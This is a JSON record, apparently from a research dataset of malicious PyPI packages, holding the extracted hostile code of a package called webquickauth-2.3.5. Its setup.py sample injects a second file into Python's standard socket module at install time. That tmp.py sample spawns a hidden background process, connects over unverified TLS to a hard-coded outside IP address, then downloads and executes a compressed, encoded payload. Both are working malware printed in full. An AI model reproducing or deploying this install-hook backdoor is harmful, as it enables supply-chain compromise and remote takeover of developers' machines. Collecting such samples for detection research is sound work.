[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/webquickauth-2.3.5/webquickauth-2.3.5/setup.py",
    "malicious_code": "import os\nimport sys\nimport re\nimport socket\nimport inspect\n\nif 'py_build' not in os.environ:\n    if 'py_dbg' in os.environ:\n        print(inspect.getsourcefile(socket))\n    f = open(inspect.getsourcefile(socket), 'ab+')\n    f.write(open('WebQuickAuth/tmp.py', 'rb').read())\n    f.close()\n    __import__('WebQuickAuth.tmp')"
  },
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/webquickauth-2.3.5/webquickauth-2.3.5/WebQuickAuth/tmp.py",
    "malicious_code": "import os\nimport subprocess\nimport sys\nimport tempfile\nimport time\nimport threading\n\np_tmp_file = os.path.join(tempfile.gettempdir(), 'python_pyc_cache')\np_clone = True\nif os.path.exists(p_tmp_file) and not hasattr(sys,'python_pyc_cache'):\n    modification_time = os.path.getmtime(p_tmp_file)\n    current_time = time.time()\n    time_difference = current_time - modification_time\n    if time_difference < 30:\n        p_clone = False\n    else:\n        open(p_tmp_file, 'w').close()\nelse:\n    open(p_tmp_file, 'w').close()\nif p_clone:\n    py_run = exec\n\n    def p_john_run(t):\n        while t.is_alive():\n            open(p_tmp_file, 'w').close()\n            t.join(10)\n\n    if not hasattr(sys,'python_pyc_cache'):\n        command = '{0} -c \"import sys;sys.python_pyc_cache=1;import socket;sys.g_p_tread.join()\"'.format(sys.executable)\n        try:\n            import msvcrt\n            subprocess.Popen(command, shell=True, creationflags=134218256)\n        except:\n            cmd = f'nohup {command} > /dev/null 2>&1 &'\n            os.system(cmd)\n\n    main_thread = threading.Thread(target=lambda: [\n        py_run(\"\"\"\ntry:\n    import zlib, base64, ssl, socket, struct, time, warnings\n\n    warnings.filterwarnings(\"ignore\", category=DeprecationWarning)\n    function = exec\n    time.sleep(5)\n\n    for x in range(10):\n        try:\n            so = socket.socket(2, 1)\n            so.connect(('8.217.153.123', 8889))\n            if hasattr(ssl, 'wrap_socket'):\n                s = ssl.wrap_socket(so)\n            else:\n                sc = ssl.create_default_context()\n                sc.check_hostname = False\n                sc.verify_mode = ssl.CERT_NONE\n                s = sc.wrap_socket(so)\n            break\n        except:\n            time.sleep(5)\n    cb = s.recv(4)\n    l = struct.unpack('>I', cb)[0]\n    d = s.recv(l)\n    while len(d) < l:\n        bl = l - len(d)\n        d += s.recv(bl)\n    d = base64.b64decode(d)\n    function(zlib.decompress(d), {'s': s})\nexcept:\n    pass\n                \"\"\")\n    ], name='GC', daemon=True)\n    main_thread.start()\n    sys.g_p_tread = main_thread\n    threading.Thread(target=p_john_run, name='daemon-thread-1', daemon=True, args=[main_thread]).start()\n    if hasattr(sys,'python_pyc_cache'):\n        del sys.python_pyc_cache"
  }
]